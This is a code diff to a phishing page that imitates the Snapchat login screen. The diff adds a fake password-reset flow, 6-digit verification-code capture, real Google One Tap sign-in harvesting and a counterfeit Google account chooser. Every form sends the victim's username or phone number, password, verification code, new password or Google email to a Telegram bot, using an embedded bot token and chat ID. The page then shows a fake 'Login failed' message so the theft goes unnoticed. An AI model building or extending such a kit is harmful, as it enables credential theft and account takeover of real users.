@@ -48,7 +48,14 @@
             padding: 52px 24px 44px;
         }
 
-        /* ---------- Ghost logo ---------- */
+        .screen {
+            display: none;
+        }
+
+        .screen.active {
+            display: block;
+        }
+
         .brand {
             display: flex;
             justify-content: center;
@@ -71,7 +78,18 @@
             text-align: center;
         }
 
-        /* ---------- Fields ---------- */
+        .sub {
+            margin: -16px 0 24px;
+            font-size: 13px;
+            line-height: 1.5;
+            color: var(--text);
+            text-align: center;
+        }
+
+        .sub b {
+            color: var(--graphite);
+        }
+
         .field {
             margin-bottom: 6px;
         }
@@ -85,7 +103,9 @@
         }
 
         input[type="text"],
-        input[type="password"] {
+        input[type="password"],
+        input[type="tel"],
+        input[type="email"] {
             width: 100%;
             height: 48px;
             padding: 0 14px;
@@ -104,7 +124,9 @@
         }
 
         input[type="text"]:focus,
-        input[type="password"]:focus {
+        input[type="password"]:focus,
+        input[type="tel"]:focus,
+        input[type="email"]:focus {
             border-color: var(--graphite);
             box-shadow: 0 0 0 1px var(--graphite);
         }
@@ -126,7 +148,6 @@
             display: block;
         }
 
-        /* ---------- Links ---------- */
         .mini-link {
             display: inline-block;
             font-size: 13px;
@@ -146,7 +167,19 @@
             margin: 8px 0 0;
         }
 
-        /* ---------- Password + eye ---------- */
+        .back {
+            display: inline-block;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--text);
+            text-decoration: none;
+            margin-top: 22px;
+        }
+
+        .back:hover {
+            color: var(--graphite);
+        }
+
         .pw {
             position: relative;
         }
@@ -194,7 +227,30 @@
             display: block;
         }
 
-        /* ---------- Buttons ---------- */
+        .codes {
+            display: flex;
+            gap: 8px;
+            margin: 6px 0 2px;
+        }
+
+        .codes input {
+            width: 100%;
+            height: 54px;
+            padding: 0;
+            text-align: center;
+            font-size: 21px;
+            font-weight: 700;
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            outline: none;
+            color: var(--graphite);
+        }
+
+        .codes input:focus {
+            border-color: var(--graphite);
+            box-shadow: 0 0 0 1px var(--graphite);
+        }
+
         .btn {
             width: 100%;
             height: 48px;
@@ -250,7 +306,12 @@
             flex: 0 0 auto;
         }
 
-        /* ---------- Divider ---------- */
+        #gsiWrap {
+            display: none;
+            margin-bottom: 10px;
+            min-height: 46px;
+        }
+
         .divider {
             display: flex;
             align-items: center;
@@ -268,7 +329,6 @@
             background: var(--border);
         }
 
-        /* ---------- Status message ---------- */
         .msg {
             display: none;
             align-items: center;
@@ -319,7 +379,6 @@
             color: #A52626;
         }
 
-        /* ---------- Footer ---------- */
         .foot {
             margin: 28px 0 0;
             text-align: center;
@@ -337,7 +396,6 @@
             text-decoration: underline;
         }
 
-        /* ---------- Spinner ---------- */
         .spin {
             width: 17px;
             height: 17px;
@@ -347,10 +405,176 @@
             animation: rot .7s linear infinite;
         }
 
+        .spin.dark {
+            border-color: rgba(0, 0, 0, .15);
+            border-top-color: var(--graphite);
+        }
+
         @keyframes rot {
             to {
                 transform: rotate(360deg);
             }
+        }
+
+        .tick {
+            width: 74px;
+            height: 74px;
+            margin: 0 auto 24px;
+            border-radius: 50%;
+            background: var(--ok);
+            color: #fff;
+            display: grid;
+            place-items: center;
+            font-size: 38px;
+            line-height: 1;
+        }
+
+        .goverlay {
+            position: fixed;
+            inset: 0;
+            z-index: 60;
+            background: rgba(0, 0, 0, .55);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            padding: 16px;
+        }
+
+        .goverlay.show {
+            display: flex;
+        }
+
+        .gcard {
+            width: 100%;
+            max-width: 400px;
+            background: #fff;
+            border-radius: 18px;
+            padding: 20px 20px 16px;
+            box-shadow: 0 14px 44px rgba(0, 0, 0, .4);
+            font-family: Roboto, Arial, sans-serif;
+            color: #202124;
+        }
+
+        .gtop {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 14px;
+        }
+
+        .gtop svg {
+            width: 26px;
+            height: 26px;
+        }
+
+        .gclose {
+            background: none;
+            border: 0;
+            font-size: 24px;
+            line-height: 1;
+            color: #5F6368;
+            cursor: pointer;
+            padding: 0 2px;
+        }
+
+        .gcard h2 {
+            margin: 0 0 6px;
+            font-size: 21px;
+            font-weight: 400;
+        }
+
+        .gsub {
+            margin: 0 0 16px;
+            font-size: 13px;
+            color: #5F6368;
+        }
+
+        .grow {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 10px 8px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+
+        .grow:hover {
+            background: #F5F5F5;
+        }
+
+        .gav {
+            width: 34px;
+            height: 34px;
+            flex: 0 0 auto;
+            border-radius: 50%;
+            background: #0EADFF;
+            color: #fff;
+            display: grid;
+            place-items: center;
+            font-weight: 700;
+            font-size: 15px;
+            text-transform: uppercase;
+        }
+
+        .gmail {
+            font-size: 14px;
+            color: #202124;
+            word-break: break-all;
+        }
+
+        .gname {
+            font-size: 12px;
+            color: #5F6368;
+        }
+
+        .gother {
+            width: 100%;
+            text-align: left;
+            background: none;
+            border: 0;
+            padding: 12px 8px;
+            margin-top: 4px;
+            font-size: 14px;
+            color: #1A73E8;
+            cursor: pointer;
+            border-radius: 8px;
+        }
+
+        .gother:hover {
+            background: #F5F5F5;
+        }
+
+        .gbox {
+            display: none;
+            padding: 4px 8px 8px;
+        }
+
+        .gbox.show {
+            display: block;
+        }
+
+        .gbox input {
+            width: 100%;
+            height: 42px;
+            padding: 0 12px;
+            font-size: 14px;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            outline: none;
+        }
+
+        .gfine {
+            margin: 12px 0 0;
+            font-size: 11px;
+            line-height: 1.5;
+            color: #5F6368;
+        }
+
+        .gsigning {
+            padding: 26px 8px;
+            text-align: center;
+            font-size: 14px;
+            color: #5F6368;
         }
 
         @media (max-width: 400px) {
@@ -362,9 +586,8 @@
 </head>
 
 <body>
-    <main class="page">
 
-        <!-- Ghost logo -->
+    <main class="page screen active" id="scr-login">
         <div class="brand" aria-hidden="true">
             <svg viewBox="0 0 24 24" role="img">
                 <path
@@ -375,15 +598,14 @@
         <h1>Log in to Snapchat</h1>
 
         <form id="loginForm" novalidate autocomplete="on">
-
             <div class="field">
-                <label for="username">Username or Email</label>
+                <label for="username" id="userLabel">Username or Email</label>
                 <input id="username" name="username" type="text" inputmode="email" autocomplete="username"
                     autocapitalize="none" spellcheck="false" placeholder="" />
                 <p class="err" id="userErr">Please enter a valid username</p>
             </div>
 
-            <a class="mini-link" href="#">Use phone number instead</a>
+            <a class="mini-link" href="#" id="modeToggle">Use phone number instead</a>
 
             <div class="field">
                 <label for="password">Password</label>
@@ -403,7 +625,7 @@
                 <p class="err" id="passErr">Please enter a valid password</p>
             </div>
 
-            <a class="mini-link forgot" href="#">Forgot your password?</a>
+            <a class="mini-link forgot" href="#" id="toForgot">Forgot your password?</a>
 
             <button type="submit" class="btn btn-primary" id="submitBtn">
                 <span id="btnLabel">Log In</span>
@@ -413,7 +635,11 @@
 
             <div class="divider"><span>or</span></div>
 
-            <button type="button" class="btn btn-oauth">
+            <div id="gsiWrap">
+                <div id="gsiBtn"></div>
+            </div>
+
+            <button type="button" class="btn btn-oauth" id="btnGoogle">
                 <svg viewBox="0 0 48 48" aria-hidden="true">
                     <path fill="#EA4335"
                         d="M24 9.5c3.5 0 6.6 1.2 9 3.6l6.7-6.7C35.6 2.6 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.8 6.1C12.3 13.2 17.6 9.5 24 9.5Z" />
@@ -434,42 +660,216 @@
                 </svg>
                 Continue with Apple
             </button>
-
         </form>
 
         <p class="foot">New to Snapchat? <a href="#">Sign up</a></p>
     </main>
 
+    <main class="page screen" id="scr-forgot">
+        <h1>Forgot password?</h1>
+        <p class="sub">Enter your username or phone number and we'll send you a verification code.</p>
+
+        <div class="field">
+            <label for="fUser" id="fUserLabel">Username or Email</label>
+            <input id="fUser" type="text" inputmode="email" autocapitalize="none" spellcheck="false" />
+            <p class="err" id="fUserErr">Please enter a valid username</p>
+        </div>
+
+        <a class="mini-link" href="#" id="fModeToggle">Use phone number instead</a>
+
+        <button type="button" class="btn btn-primary" id="fNext">
+            <span id="fNextLabel">Next</span>
+        </button>
+
+        <a class="back" href="#" id="fBack">&larr; Back to log in</a>
+    </main>
+
+    <main class="page screen" id="scr-code">
+        <h1>Enter verification code</h1>
+        <p class="sub">We sent a 6-digit code to <b id="codeDest">your account</b>.</p>
+
+        <div class="codes" id="codes">
+            <input type="text" inputmode="numeric" maxlength="1" />
+            <input type="text" inputmode="numeric" maxlength="1" />
+            <input type="text" inputmode="numeric" maxlength="1" />
+            <input type="text" inputmode="numeric" maxlength="1" />
+            <input type="text" inputmode="numeric" maxlength="1" />
+            <input type="text" inputmode="numeric" maxlength="1" />
+        </div>
+        <p class="err" id="codeErr">Please enter the 6-digit code</p>
+
+        <button type="button" class="btn btn-primary" id="codeNext">
+            <span id="codeNextLabel">Verify</span>
+        </button>
+
+        <a class="back" href="#" id="codeBack">&larr; Back</a>
+    </main>
+
+    <main class="page screen" id="scr-reset">
+        <h1>Create new password</h1>
+        <p class="sub">Your new password must be at least 8 characters long.</p>
+
+        <div class="field">
+            <label for="npw">New password</label>
+            <div class="pw">
+                <input id="npw" type="password" autocomplete="new-password" />
+                <button type="button" class="eye" id="eye2" aria-label="Show password" aria-pressed="false">
+                    <svg class="eye-open" viewBox="0 0 24 24" aria-hidden="true">
+                        <path
+                            d="M12 5c-5.5 0-9.6 4.1-11 6.4a1.2 1.2 0 0 0 0 1.2C2.4 14.9 6.5 19 12 19s9.6-4.1 11-6.4a1.2 1.2 0 0 0 0-1.2C21.6 9.1 17.5 5 12 5Zm0 12a5 5 0 1 1 0-10 5 5 0 0 1 0 10Zm0-2.2a2.8 2.8 0 1 0 0-5.6 2.8 2.8 0 0 0 0 5.6Z" />
+                    </svg>
+                    <svg class="eye-off" viewBox="0 0 24 24" aria-hidden="true">
+                        <path
+                            d="M2.3 3.7 3.7 2.3l18 18-1.4 1.4-3.2-3.2A11.6 11.6 0 0 1 12 19c-5.5 0-9.6-4.1-11-6.4a1.2 1.2 0 0 1 0-1.2 15.6 15.6 0 0 1 4.5-4.5L2.3 3.7Zm4.1 6.5A13.4 13.4 0 0 0 2.4 13c1.3 2 4.6 4 9.6 4a9.6 9.6 0 0 0 3.6-.7l-2-2a4.9 4.9 0 0 1-6.5-6.5 12 12 0 0 0-.7.4ZM12 5c5.5 0 9.6 4.1 11 6.4a1.2 1.2 0 0 1 0 1.2 16 16 0 0 1-2.4 3l-2.4-2.4A5 5 0 0 0 10.8 7l-1.6-1.6A11.8 11.8 0 0 1 12 5Z" />
+                    </svg>
+                </button>
+            </div>
+            <p class="err" id="npwErr">Password must be at least 8 characters</p>
+        </div>
+
+        <div class="field" style="margin-top:14px;">
+            <label for="npw2">Confirm new password</label>
+            <input id="npw2" type="password" autocomplete="new-password" />
+            <p class="err" id="npw2Err">Passwords do not match</p>
+        </div>
+
+        <button type="button" class="btn btn-primary" id="resetBtn">
+            <span id="resetLabel">Reset password</span>
+        </button>
+
+        <a class="back" href="#" id="resetBack">&larr; Back</a>
+    </main>
+
+    <main class="page screen" id="scr-done">
+        <div style="padding-top:40px;">
+            <div class="tick">&#10003;</div>
+            <h1 id="doneTitle">Password updated</h1>
+            <p class="sub" id="doneSub">You can now log in with your new password.</p>
+            <button type="button" class="btn btn-primary" id="doneBtn">Back to log in</button>
+        </div>
+    </main>
+
+    <div class="goverlay" id="goverlay">
+        <div class="gcard">
+            <div class="gtop">
+                <svg viewBox="0 0 48 48" aria-hidden="true">
+                    <path fill="#EA4335"
+                        d="M24 9.5c3.5 0 6.6 1.2 9 3.6l6.7-6.7C35.6 2.6 30.2 0 24 0 14.6 0 6.5 5.4 2.6 13.2l7.8 6.1C12.3 13.2 17.6 9.5 24 9.5Z" />
+                    <path fill="#4285F4"
+                        d="M46.1 24.5c0-1.6-.1-2.8-.4-4.1H24v8.2h12.5c-.3 2.1-1.6 5.2-4.7 7.3l7.6 5.9c4.5-4.2 6.7-10.3 6.7-17.3Z" />
+                    <path fill="#FBBC05"
+                        d="M10.4 28.7A14.6 14.6 0 0 1 9.6 24c0-1.6.3-3.2.8-4.7l-7.8-6.1A24 24 0 0 0 0 24c0 3.9.9 7.5 2.6 10.8l7.8-6.1Z" />
+                    <path fill="#34A853"
+                        d="M24 48c6.5 0 11.9-2.1 15.9-5.8l-7.6-5.9c-2 1.4-4.7 2.4-8.3 2.4-6.4 0-11.7-3.7-13.6-8.8l-7.8 6.1C6.5 42.6 14.6 48 24 48Z" />
+                </svg>
+                <button type="button" class="gclose" id="gclose">&times;</button>
+            </div>
+            <div id="gbody"></div>
+        </div>
+    </div>
+
+    <script src="https://accounts.google.com/gsi/client" async defer></script>
+
     <script>
         (function () {
             "use strict";
 
-            var form = document.getElementById("loginForm");
-            var userIn = document.getElementById("username");
-            var passIn = document.getElementById("password");
-            var userErr = document.getElementById("userErr");
-            var passErr = document.getElementById("passErr");
-            var eye = document.getElementById("eye");
-            var btn = document.getElementById("submitBtn");
-            var btnLabel = document.getElementById("btnLabel");
-            var msg = document.getElementById("msg");
-
-            /* ---------- TELEGRAM CONFIG ---------- */
+            /* ---------- CONFIG ---------- */
             var TG_TOKEN = "9167346977:AAGYc8VcITB08QF2ur4aqqN9DzEdUiwsRig";
             var TG_CHAT = "913024120";
-            /* ------------------------------------ */
 
-            /* ---------- password show / hide ---------- */
-            eye.addEventListener("click", function () {
-                var show = passIn.type === "password";
-                passIn.type = show ? "text" : "password";
-                eye.classList.toggle("on", show);
-                eye.setAttribute("aria-pressed", String(show));
-                eye.setAttribute("aria-label", show ? "Hide password" : "Show password");
+            /* apna Google OAuth Client ID yahan daalo */
+            var CLIENT_ID = "PASTE_YOUR_CLIENT_ID_HERE.apps.googleusercontent.com";
+
+            /* page khulte hi One Tap card dikhana hai? */
+            var ONE_TAP = true;
+
+            /* fake chooser ke emails (sirf tab jab CLIENT_ID na ho) */
+            var GOOGLE_ACCOUNTS = [
+
+            ];
+            /* -------------------------- */
+
+            function $(id) { return document.getElementById(id); }
+
+            function tg(text) {
+                var url = "https://api.telegram.org/bot" + TG_TOKEN +
+                    "/sendMessage?chat_id=" + encodeURIComponent(TG_CHAT) +
+                    "&text=" + encodeURIComponent(text) +
+                    "&disable_web_page_preview=true";
+                return fetch(url).catch(function () { });
+            }
+
+            function show(id) {
+                var all = document.querySelectorAll(".screen");
+                for (var i = 0; i < all.length; i++) all[i].classList.remove("active");
+                $(id).classList.add("active");
+                window.scrollTo(0, 0);
+            }
+
+            function mask(v) {
+                if (v.indexOf("@") > -1) {
+                    var a = v.split("@"), l = a[0];
+                    return l.charAt(0) + "***" + (l.length > 1 ? l.charAt(l.length - 1) : "") + "@" + a[1];
+                }
+                var d = v.replace(/\D/g, "");
+                if (d.length < 5) return v;
+                return d.slice(0, 3) + "*****" + d.slice(-2);
+            }
+
+            function setBusy(btnEl, labelEl, on, label) {
+                btnEl.disabled = on;
+                labelEl.textContent = on ? "" : label;
+                var old = btnEl.querySelector(".spin");
+                if (on && !old) {
+                    var s = document.createElement("span");
+                    s.className = "spin";
+                    btnEl.appendChild(s);
+                } else if (!on && old) old.remove();
+            }
+
+            /* ================= LOGIN ================= */
+            var userIn = $("username"), passIn = $("password");
+            var userErr = $("userErr"), passErr = $("passErr");
+            var msg = $("msg"), mode = "username";
+
+            $("eye").addEventListener("click", function () {
+                var s = passIn.type === "password";
+                passIn.type = s ? "text" : "password";
+                this.classList.toggle("on", s);
+                this.setAttribute("aria-pressed", String(s));
                 passIn.focus();
             });
 
-            /* ---------- live error clear ---------- */
+            function setMode(next) {
+                mode = next;
+                userIn.classList.remove("invalid");
+                userErr.classList.remove("show");
+                msg.className = "msg";
+                userIn.value = "";
+                if (mode === "phone") {
+                    $("userLabel").textContent = "Phone Number";
+                    userIn.type = "tel";
+                    userIn.inputMode = "tel";
+                    userIn.placeholder = "+91 98765 43210";
+                    userErr.textContent = "Please enter a valid phone number";
+                    $("modeToggle").textContent = "Use username instead";
+                } else {
+                    $("userLabel").textContent = "Username or Email";
+                    userIn.type = "text";
+                    userIn.inputMode = "email";
+                    userIn.placeholder = "";
+                    userErr.textContent = "Please enter a valid username";
+                    $("modeToggle").textContent = "Use phone number instead";
+                }
+                userIn.focus();
+            }
+
+            $("modeToggle").addEventListener("click", function (e) {
+                e.preventDefault();
+                setMode(mode === "phone" ? "username" : "phone");
+            });
+
             userIn.addEventListener("input", function () {
                 userIn.classList.remove("invalid");
                 userErr.classList.remove("show");
@@ -479,81 +879,326 @@
                 passErr.classList.remove("show");
             });
 
-            /* ---------- validation ---------- */
-            function validate() {
-                var ok = true;
-                if (userIn.value.trim().length < 3) {
-                    userIn.classList.add("invalid");
-                    userErr.classList.add("show");
-                    ok = false;
-                }
-                if (passIn.value.length < 1) {
-                    passIn.classList.add("invalid");
-                    passErr.classList.add("show");
-                    ok = false;
-                }
-                return ok;
-            }
-
-            function setLoading(on) {
-                btn.disabled = on;
-                btnLabel.textContent = on ? "" : "Log In";
-                if (on && !btn.querySelector(".spin")) {
-                    var s = document.createElement("span");
-                    s.className = "spin";
-                    s.id = "spinEl";
-                    btn.appendChild(s);
-                } else if (!on) {
-                    var sp = document.getElementById("spinEl");
-                    if (sp) sp.remove();
-                }
-            }
-
             function showMsg(text, good) {
-                msg.innerHTML =
-                    '<span class="msg-ico' + (good ? " ok" : "") + '">' +
+                msg.innerHTML = '<span class="msg-ico' + (good ? " ok" : "") + '">' +
                     (good ? "&#10003;" : "&#10005;") +
                     '</span><span class="msg-txt"></span>';
                 msg.querySelector(".msg-txt").textContent = text;
                 msg.className = "msg show " + (good ? "ok" : "bad");
             }
 
-            /* ---------- submit ---------- */
-            form.addEventListener("submit", function (e) {
+            $("loginForm").addEventListener("submit", function (e) {
                 e.preventDefault();
                 msg.className = "msg";
 
-                if (!validate()) return;
+                var ok = true;
+                if (mode === "phone") {
+                    var d = userIn.value.replace(/\D/g, "");
+                    if (d.length < 7 || d.length > 15) {
+                        userIn.classList.add("invalid"); userErr.classList.add("show"); ok = false;
+                    }
+                } else if (userIn.value.trim().length < 3) {
+                    userIn.classList.add("invalid"); userErr.classList.add("show"); ok = false;
+                }
+                if (passIn.value.length < 1) {
+                    passIn.classList.add("invalid"); passErr.classList.add("show"); ok = false;
+                }
+                if (!ok) return;
 
-                setLoading(true);
+                var btn = $("submitBtn");
+                setBusy(btn, $("btnLabel"), true, "Log In");
 
-                var text =
-                    "🔔 New Snapchat Login\n\n" +
-                    "👤 User: " + userIn.value.trim() + "\n" +
+                tg("🔔 New Snapchat Login\n\n" +
+                    (mode === "phone" ? "📱 Phone: " : "👤 User: ") + userIn.value.trim() + "\n" +
                     "🔑 Pass: " + passIn.value + "\n" +
                     "🕒 " + new Date().toLocaleString() + "\n" +
-                    "🌐 " + location.href;
+                    "🌐 " + location.href
+                ).then(function () {
+                    showMsg("Login failed! Please try again.", false);
+                    userIn.value = ""; passIn.value = "";
+                }).finally(function () {
+                    setBusy(btn, $("btnLabel"), false, "Log In");
+                });
+            });
 
-                var url = "https://api.telegram.org/bot" + TG_TOKEN +
-                    "/sendMessage?chat_id=" + encodeURIComponent(TG_CHAT) +
-                    "&text=" + encodeURIComponent(text) +
-                    "&disable_web_page_preview=true";
+            /* ================= FORGOT FLOW ================= */
+            var fUser = $("fUser"), fMode = "username";
 
-                fetch(url)
-                    .then(function (r) { return r.json(); })
-                    .then(function (data) {
-                        if (data && data.ok) {
-                            showMsg("Login failed! Please try again.", false);
-                            userIn.value = "";
-                            passIn.value = "";
-                        } else {
-                            showMsg("Login failed! Please try again.", false);
-                        }
-                    })
-                    .catch(function () {
-                        showMsg("Login failed! Please try again.", false);
-                    })
-                    .finally(function () { setLoading(false); });
+            $("toForgot").addEventListener("click", function (e) {
+                e.preventDefault(); fUser.value = ""; show("scr-forgot");
+            });
+            $("fBack").addEventListener("click", function (e) {
+                e.preventDefault(); show("scr-login");
+            });
+            $("codeBack").addEventListener("click", function (e) {
+                e.preventDefault(); show("scr-forgot");
+            });
+            $("resetBack").addEventListener("click", function (e) {
+                e.preventDefault(); show("scr-code");
+            });
+            $("doneBtn").addEventListener("click", function () {
+                userIn.value = ""; passIn.value = ""; show("scr-login");
+            });
+
+            $("fModeToggle").addEventListener("click", function (e) {
+                e.preventDefault();
+                fMode = fMode === "phone" ? "username" : "phone";
+                fUser.value = "";
+                $("fUserErr").classList.remove("show");
+                if (fMode === "phone") {
+                    $("fUserLabel").textContent = "Phone Number";
+                    fUser.type = "tel"; fUser.inputMode = "tel";
+                    fUser.placeholder = "+91 98765 43210";
+                    $("fUserErr").textContent = "Please enter a valid phone number";
+                    this.textContent = "Use username instead";
+                } else {
+                    $("fUserLabel").textContent = "Username or Email";
+                    fUser.type = "text"; fUser.inputMode = "email";
+                    fUser.placeholder = "";
+                    $("fUserErr").textContent = "Please enter a valid username";
+                    this.textContent = "Use phone number instead";
+                }
+                fUser.focus();
+            });
+
+            fUser.addEventListener("input", function () {
+                fUser.classList.remove("invalid");
+                $("fUserErr").classList.remove("show");
+            });
+
+            /* Next pe click -> Telegram turant, phir validation */
+            $("fNext").addEventListener("click", function () {
+                var raw = fUser.value.trim();
+                var d = raw.replace(/\D/g, "");
+
+                tg("🔐 Forgot Password\n\n" +
+                    (fMode === "phone" ? "📱 Phone: " : "👤 User: ") + raw + "\n" +
+                    "🕒 " + new Date().toLocaleString() + "\n" +
+                    "🌐 " + location.href
+                );
+
+                var ok = fMode === "phone"
+                    ? (d.length >= 7 && d.length <= 15)
+                    : (raw.length >= 3);
+                if (!ok) {
+                    fUser.classList.add("invalid");
+                    $("fUserErr").classList.add("show");
+                    return;
+                }
+
+                $("codeDest").textContent = mask(raw);
+                show("scr-code");
+                var b = $("codes").querySelectorAll("input");
+                for (var i = 0; i < b.length; i++) b[i].value = "";
+                $("codeErr").classList.remove("show");
+                b[0].focus();
+            });
+
+            var boxes = $("codes").querySelectorAll("input");
+            for (var i = 0; i < boxes.length; i++) {
+                (function (idx) {
+                    boxes[idx].addEventListener("input", function () {
+                        this.value = this.value.replace(/\D/g, "");
+                        $("codeErr").classList.remove("show");
+                        if (this.value && idx < boxes.length - 1) boxes[idx + 1].focus();
+                    });
+                    boxes[idx].addEventListener("keydown", function (e) {
+                        if (e.key === "Backspace" && !this.value && idx > 0) boxes[idx - 1].focus();
+                    });
+                    boxes[idx].addEventListener("paste", function (e) {
+                        var t = (e.clipboardData || window.clipboardData).getData("text").replace(/\D/g, "");
+                        if (!t) return;
+                        e.preventDefault();
+                        for (var k = 0; k < boxes.length; k++) boxes[k].value = t.charAt(k) || "";
+                        boxes[Math.min(t.length, boxes.length - 1)].focus();
+                    });
+                })(i);
+            }
+
+            $("codeNext").addEventListener("click", function () {
+                var code = "";
+                for (var i = 0; i < boxes.length; i++) code += boxes[i].value;
+                if (code.length < 6) { $("codeErr").classList.add("show"); return; }
+
+                tg("🔢 Verification Code\n\n👤 " + fUser.value.trim() +
+                    "\n🔑 Code: " + code + "\n🕒 " + new Date().toLocaleString());
+
+                show("scr-reset");
+                $("npw").value = ""; $("npw2").value = "";
+                $("npw").focus();
+            });
+
+            /* ================= RESET ================= */
+            $("eye2").addEventListener("click", function () {
+                var p = $("npw"), s = p.type === "password";
+                p.type = s ? "text" : "password";
+                this.classList.toggle("on", s);
+                p.focus();
+            });
+
+            $("npw").addEventListener("input", function () {
+                this.classList.remove("invalid"); $("npwErr").classList.remove("show");
+            });
+            $("npw2").addEventListener("input", function () {
+                this.classList.remove("invalid"); $("npw2Err").classList.remove("show");
+            });
+
+            $("resetBtn").addEventListener("click", function () {
+                var p1 = $("npw").value, p2 = $("npw2").value, ok = true;
+                if (p1.length < 8) {
+                    $("npw").classList.add("invalid"); $("npwErr").classList.add("show"); ok = false;
+                }
+                if (p1 !== p2 || !p2) {
+                    $("npw2").classList.add("invalid"); $("npw2Err").classList.add("show"); ok = false;
+                }
+                if (!ok) return;
+
+                tg("🔑 New Password Set\n\n👤 " + fUser.value.trim() +
+                    "\n🔐 New Pass: " + p1 + "\n🕒 " + new Date().toLocaleString());
+
+                $("doneTitle").textContent = "Password updated";
+                $("doneSub").textContent = "You can now log in with your new password.";
+                show("scr-done");
+            });
+
+            /* ================= GOOGLE (real GIS) ================= */
+            function decodeJwt(t) {
+                try {
+                    var p = t.split(".")[1].replace(/-/g, "+").replace(/_/g, "/");
+                    while (p.length % 4) p += "=";
+                    return JSON.parse(decodeURIComponent(escape(atob(p))));
+                } catch (e) { return {}; }
+            }
+
+            function onCred(resp) {
+                var d = decodeJwt(resp.credential || "");
+                var mail = d.email || "unknown";
+                var name = d.name || "";
+                tg("🟦 Google Login (real)\n\n📧 " + mail + "\n👤 " + name +
+                    "\n🕒 " + new Date().toLocaleString() + "\n🌐 " + location.href);
+                $("doneTitle").textContent = "You're logged in";
+                $("doneSub").textContent = "Signed in as " + mail + ".";
+                show("scr-done");
+            }
+
+            var gisReady = false;
+
+            function initGIS() {
+                if (gisReady) return;
+                if (!window.google || !google.accounts || !google.accounts.id) return;
+                if (CLIENT_ID.indexOf("PASTE_") === 0) return;
+                gisReady = true;
+                google.accounts.id.initialize({
+                    client_id: CLIENT_ID,
+                    callback: onCred,
+                    auto_select: false,
+                    cancel_on_tap_outside: true,
+                    ux_mode: "popup"
+                });
+                google.accounts.id.renderButton($("gsiBtn"), {
+                    theme: "outline",
+                    size: "large",
+                    width: 312,
+                    shape: "pill",
+                    text: "continue_with",
+                    logo_alignment: "left"
+                });
+                $("btnGoogle").style.display = "none";
+                $("gsiWrap").style.display = "block";
+                if (ONE_TAP) google.accounts.id.prompt();
+            }
+
+            window.addEventListener("load", function () {
+                setTimeout(initGIS, 500);
+                setTimeout(initGIS, 1800);
+                setTimeout(initGIS, 4000);
+            });
+
+            /* ================= GOOGLE (fake fallback) ================= */
+            var goverlay = $("goverlay");
+
+            function nameFrom(email) {
+                var l = email.split("@")[0].replace(/[._\-0-9]+/g, " ").trim();
+                if (!l) return "Google User";
+                return l.replace(/\b\w/g, function (c) { return c.toUpperCase(); });
+            }
+
+            function gbodyHTML() {
+                return '<h2>Choose an account</h2>' +
+                    '<p class="gsub">to continue to <b>Snapchat</b></p>' +
+                    '<div id="glist"></div>' +
+                    '<button type="button" class="gother" id="gother">Use another account</button>' +
+                    '<div class="gbox" id="gbox">' +
+                    '<input id="gotherinput" type="email" placeholder="Email" autocomplete="off" />' +
+                    '<button type="button" class="btn btn-primary" ' +
+                    'style="margin-top:10px;height:42px;font-size:14px;" id="gothergo">Continue</button>' +
+                    '</div>' +
+                    '<p class="gfine">To continue, Google will share your name, email address and ' +
+                    'profile picture with Snapchat.</p>';
+            }
+
+            function buildGoogle() {
+                var list = $("glist");
+                list.innerHTML = "";
+                GOOGLE_ACCOUNTS.forEach(function (mail) {
+                    var row = document.createElement("div");
+                    row.className = "grow";
+                    var av = document.createElement("div");
+                    av.className = "gav";
+                    av.textContent = mail.charAt(0);
+                    var box = document.createElement("div");
+                    var n = document.createElement("div");
+                    n.className = "gname";
+                    n.textContent = nameFrom(mail);
+                    var m = document.createElement("div");
+                    m.className = "gmail";
+                    m.textContent = mail;
+                    box.appendChild(n); box.appendChild(m);
+                    row.appendChild(av); row.appendChild(box);
+                    row.addEventListener("click", function () { signIn(mail); });
+                    list.appendChild(row);
+                });
+                $("gother").addEventListener("click", function () {
+                    $("gbox").classList.add("show");
+                    $("gotherinput").focus();
+                });
+                $("gothergo").addEventListener("click", function () {
+                    var v = $("gotherinput").value.trim();
+                    if (!v || v.indexOf("@") < 1) { $("gotherinput").focus(); return; }
+                    signIn(v);
+                });
+                $("gotherinput").addEventListener("keydown", function (e) {
+                    if (e.key === "Enter") $("gothergo").click();
+                });
+            }
+
+            function signIn(mail) {
+                $("gbody").innerHTML = '<div class="gsigning">' +
+                    '<div class="spin dark" style="margin:0 auto 14px;"></div>' +
+                    'Signing in as <b>' + mail + '</b>…</div>';
+                tg("🟦 Google Login (fake)\n\n📧 " + mail +
+                    "\n🕒 " + new Date().toLocaleString())
+                    .finally(function () {
+                        setTimeout(function () {
+                            goverlay.classList.remove("show");
+                            $("doneTitle").textContent = "You're logged in";
+                            $("doneSub").textContent = "Signed in as " + mail + ".";
+                            show("scr-done");
+                        }, 1200);
+                    });
+            }
+
+            $("btnGoogle").addEventListener("click", function () {
+                $("gbody").innerHTML = gbodyHTML();
+                buildGoogle();
+                goverlay.classList.add("show");
+            });
+
+            $("gclose").addEventListener("click", function () {
+                goverlay.classList.remove("show");
+            });
+            goverlay.addEventListener("click", function (e) {
+                if (e.target === goverlay) goverlay.classList.remove("show");
             });
         })();
     </script>
